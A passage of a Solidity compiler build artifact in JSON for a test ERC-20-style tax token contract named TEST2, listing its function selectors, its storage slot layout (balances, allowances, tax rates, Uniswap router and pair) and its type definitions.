					"_maxTaxSwap()": "0faee56f",
					"_maxTxAmount()": "7d1db4a5",
					"_maxWalletSize()": "8f9a55c0",
					"_taxSwapThreshold()": "bf474bed",
					"addLiq()": "e9e1831a",
					"allowance(address,address)": "dd62ed3e",
					"approve(address,uint256)": "095ea7b3",
					"balanceOf(address)": "70a08231",
					"decimals()": "313ce567",
					"getSenderEtherBalance()": "9c7b9b7f",
					"manualSwap(uint256)": "b70143c9",
					"name()": "06fdde03",
					"openTrading()": "c9567bf9",
					"owner()": "8da5cb5b",
					"renounceOwnership()": "715018a6",
					"symbol()": "95d89b41",
					"totalSupply()": "18160ddd",
					"transfer(address,uint256)": "a9059cbb",
					"transferFrom(address,address,uint256)": "23b872dd",
					"uniswapV2Pair()": "49bd5a5e",
					"withdraw()": "3ccfd60b"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 228,
						"contract": "contracts/Test.sol:TEST2",
						"label": "_owner",
						"offset": 0,
						"slot": "0",
						"type": "t_address"
					},
					{
						"astId": 366,
						"contract": "contracts/Test.sol:TEST2",
						"label": "_balances",
						"offset": 0,
						"slot": "1",
						"type": "t_mapping(t_address,t_uint256)"
					},
					{
						"astId": 372,
						"contract": "contracts/Test.sol:TEST2",
						"label": "_allowances",
						"offset": 0,
						"slot": "2",
						"type": "t_mapping(t_address,t_mapping(t_address,t_uint256))"
					},
					{
						"astId": 376,
						"contract": "contracts/Test.sol:TEST2",
						"label": "_isExcludedFromFee",
						"offset": 0,
						"slot": "3",
						"type": "t_mapping(t_address,t_bool)"
					},
					{
						"astId": 380,
						"contract": "contracts/Test.sol:TEST2",
						"label": "_UniswapV2Pool",
						"offset": 0,
						"slot": "4",
						"type": "t_mapping(t_address,t_uint256)"
					},
					{
						"astId": 382,
						"contract": "contracts/Test.sol:TEST2",
						"label": "_taxWallet",
						"offset": 0,
						"slot": "5",
						"type": "t_address_payable"
					},
					{
						"astId": 384,
						"contract": "contracts/Test.sol:TEST2",
						"label": "firstBlock",
						"offset": 0,
						"slot": "6",
						"type": "t_uint256"
					},
					{
						"astId": 387,
						"contract": "contracts/Test.sol:TEST2",
						"label": "_initialBuyTax",
						"offset": 0,
						"slot": "7",
						"type": "t_uint256"
					},
					{
						"astId": 390,
						"contract": "contracts/Test.sol:TEST2",
						"label": "_initialSellTax",
						"offset": 0,
						"slot": "8",
						"type": "t_uint256"
					},
					{
						"astId": 393,
						"contract": "contracts/Test.sol:TEST2",
						"label": "_finalBuyTax",
						"offset": 0,
						"slot": "9",
						"type": "t_uint256"
					},
					{
						"astId": 396,
						"contract": "contracts/Test.sol:TEST2",
						"label": "_finalSellTax",
						"offset": 0,
						"slot": "10",
						"type": "t_uint256"
					},
					{
						"astId": 399,
						"contract": "contracts/Test.sol:TEST2",
						"label": "_reduceBuyTaxAt",
						"offset": 0,
						"slot": "11",
						"type": "t_uint256"
					},
					{
						"astId": 402,
						"contract": "contracts/Test.sol:TEST2",
						"label": "_reduceSellTaxAt",
						"offset": 0,
						"slot": "12",
						"type": "t_uint256"
					},
					{
						"astId": 405,
						"contract": "contracts/Test.sol:TEST2",
						"label": "_preventSwapBefore",
						"offset": 0,
						"slot": "13",
						"type": "t_uint256"
					},
					{
						"astId": 408,
						"contract": "contracts/Test.sol:TEST2",
						"label": "_buyCount",
						"offset": 0,
						"slot": "14",
						"type": "t_uint256"
					},
					{
						"astId": 431,
						"contract": "contracts/Test.sol:TEST2",
						"label": "_maxTxAmount",
						"offset": 0,
						"slot": "15",
						"type": "t_uint256"
					},
					{
						"astId": 438,
						"contract": "contracts/Test.sol:TEST2",
						"label": "_maxWalletSize",
						"offset": 0,
						"slot": "16",
						"type": "t_uint256"
					},
					{
						"astId": 452,
						"contract": "contracts/Test.sol:TEST2",
						"label": "_taxSwapThreshold",
						"offset": 0,
						"slot": "17",
						"type": "t_uint256"
					},
					{
						"astId": 459,
						"contract": "contracts/Test.sol:TEST2",
						"label": "_maxTaxSwap",
						"offset": 0,
						"slot": "18",
						"type": "t_uint256"
					},
					{
						"astId": 462,
						"contract": "contracts/Test.sol:TEST2",
						"label": "uniswapV2Router",
						"offset": 0,
						"slot": "19",
						"type": "t_contract(IUniswapV2Router02)353"
					},
					{
						"astId": 464,
						"contract": "contracts/Test.sol:TEST2",
						"label": "uniswapV2Pair",
						"offset": 0,
						"slot": "20",
						"type": "t_address"
					},
					{
						"astId": 466,
						"contract": "contracts/Test.sol:TEST2",
						"label": "tradingOpen",
						"offset": 20,
						"slot": "20",
						"type": "t_bool"
					},
					{
						"astId": 469,
						"contract": "contracts/Test.sol:TEST2",
						"label": "inSwap",
						"offset": 21,
						"slot": "20",
						"type": "t_bool"
					},
					{
						"astId": 472,
						"contract": "contracts/Test.sol:TEST2",
						"label": "swapEnabled",
						"offset": 22,
						"slot": "20",
						"type": "t_bool"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_address_payable": {
						"encoding": "inplace",
						"label": "address payable",
						"numberOfBytes": "20"
					},
					"t_bool": {
						"encoding": "inplace",
						"label": "bool",
						"numberOfBytes": "1"
					},
					"t_contract(IUniswapV2Router02)353": {
						"encoding": "inplace",
						"label": "contract IUniswapV2Router02",
						"numberOfBytes": "20"
					},
					"t_mapping(t_address,t_bool)": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => bool)",
						"numberOfBytes": "32",
						"value": "t_bool"
					},
					"t_mapping(t_address,t_mapping(t_address,t_uint256))": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => mapping(address => uint256))",
						"numberOfBytes": "32",
						"value": "t_mapping(t_address,t_uint256)"
					},
					"t_mapping(t_address,t_uint256)": {
						"encoding": "mapping",
						"key": "t_address",
						"label": "mapping(address => uint256)",
						"numberOfBytes": "32",
						"value": "t_uint256"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}